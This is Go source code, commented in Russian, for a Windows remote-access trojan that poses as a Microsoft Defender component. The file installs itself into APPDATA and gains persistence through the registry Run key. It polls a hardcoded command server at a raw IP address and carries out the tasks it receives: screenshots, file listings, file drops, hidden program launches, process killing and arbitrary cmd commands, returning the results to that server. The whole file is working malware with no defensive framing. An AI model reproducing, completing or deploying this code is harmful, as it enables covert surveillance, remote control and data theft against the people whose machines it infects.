package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// --- КОНФИГУРАЦИЯ ---
const (
	ServerURL  = "http://45.76.76.74:43445"
	SecretAuth = "COSMOS0611"
	ExeName    = "WinDefenderSmart.exe"
	MutexName  = "Global\\WinDefenderSmartInstance" // Константа была пропущена
)

// Защита от запуска нескольких копий (Mutex)
func checkSingleInstance() {
	utfName, _ := windows.UTF16PtrFromString(MutexName)
	_, err := windows.CreateMutex(nil, false, utfName)
	if err != nil {
		// Если процесс уже запущен, CreateMutex вернет ошибку, и мы выходим
		os.Exit(0)
	}
}

// Скрытое выполнение команд CMD (без окна)
func runHidden(command string) string {
	cmd := exec.Command("cmd", "/C", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(out)
}

// Установка в систему (AppData + Автозагрузка)
func install() {
	appData := os.Getenv("APPDATA")
	targetDir := filepath.Join(appData, "Microsoft", "DefenderUpdate")
	_ = os.MkdirAll(targetDir, 0755)

	targetPath := filepath.Join(targetDir, ExeName)
	selfPath, err := os.Executable()
	if err != nil {
		return
	}

	// Если мы запущены не из папки назначения — копируем себя туда
	if strings.ToLower(selfPath) != strings.ToLower(targetPath) {
		input, err := ioutil.ReadFile(selfPath)
		if err == nil {
			_ = ioutil.WriteFile(targetPath, input, 0755)
		}

		// Добавление в автозагрузку реестра (Текущий пользователь)
		k, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
		if err == nil {
			_ = k.SetStringValue("WinDefenderUpdater", targetPath)
			k.Close()
		}
	}
}

func executeCommand(task string) string {
	parts := strings.SplitN(task, " ", 2)
	cmdType := parts[0]

	switch cmdType {
	case "screenshot":
		n := screenshot.NumActiveDisplays()
		if n <= 0 {
			return "Error: No displays"
		}
		bounds := screenshot.GetDisplayBounds(0)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return "Error: " + err.Error()
		}
		var buf bytes.Buffer
		png.Encode(&buf, img)
		return "IMAGE:SCREEN:" + base64.StdEncoding.EncodeToString(buf.Bytes())

	case "ls":
		path := "."
		if len(parts) > 1 {
			path = parts[1]
		}
		files, err := ioutil.ReadDir(path)
		if err != nil {
			return "Error: " + err.Error()
		}
		var res strings.Builder
		for _, f := range files {
			isDir := "FILE"
			if f.IsDir() {
				isDir = "DIR "
			}
			res.WriteString(fmt.Sprintf("%s | %d | %s\n", isDir, f.Size(), f.Name()))
		}
		return res.String()

	case "upload_to_client": // Прием файла от сервера и сохранение
		if len(parts) < 2 {
			return "Error: No data"
		}
		subParts := strings.SplitN(parts[1], "|", 2)
		if len(subParts) < 2 {
			return "Error: Invalid format"
		}
		fName := subParts[0]
		fData, err := base64.StdEncoding.DecodeString(subParts[1])
		if err != nil {
			return "Error decoding: " + err.Error()
		}
		err = ioutil.WriteFile(fName, fData, 0644)
		if err != nil {
			return "Error saving: " + err.Error()
		}
		return "File saved: " + fName

	case "run_exe": // Запуск стороннего файла скрыто
		if len(parts) < 2 {
			return "Usage: run_exe <path>"
		}
		targetExe := parts[1]
		c := exec.Command(targetExe)
		c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err := c.Start()
		if err != nil {
			return "Error: " + err.Error()
		}
		return "Started: " + targetExe

	case "kill":
		if len(parts) < 2 {
			return "Usage: kill <pid>"
		}
		return runHidden("taskkill /F /PID " + parts[1])

	default:
		// Все остальные команды пробрасываются в CMD
		return runHidden(task)
	}
}

func main() {
	// 1. Проверка на дубликаты
	checkSingleInstance()

	// 2. Установка
	install()

	cid := os.Getenv("COMPUTERNAME") + "_" + os.Getenv("USERNAME")
	clientInfo := os.Getenv("USERNAME") + "@" + os.Getenv("COMPUTERNAME")

	// 3. Главный цикл
	for {
		client := &http.Client{Timeout: 15 * time.Second}
		req, err := http.NewRequest("GET", ServerURL+"/get_task", nil)
		if err == nil {
			req.Header.Set("X-Secret-Auth", SecretAuth)
			req.Header.Set("Client-ID", cid)
			req.Header.Set("Client-Info", clientInfo)

			resp, err := client.Do(req)
			if err == nil {
				body, _ := io.ReadAll(resp.Body)
				task := string(body)
				resp.Body.Close()

				if task != "" && task != "none" {
					result := executeCommand(task)

					// Отправка результата на сервер
					postReq, _ := http.NewRequest("POST", ServerURL+"/send_result", bytes.NewBuffer([]byte(result)))
					postReq.Header.Set("X-Secret-Auth", SecretAuth)
					postReq.Header.Set("Client-ID", cid)
					_, _ = client.Do(postReq)
				}
			}
		}
		// Твой интервал 1.5 сек для быстрого отклика
		time.Sleep(1500 * time.Millisecond)
	}
}
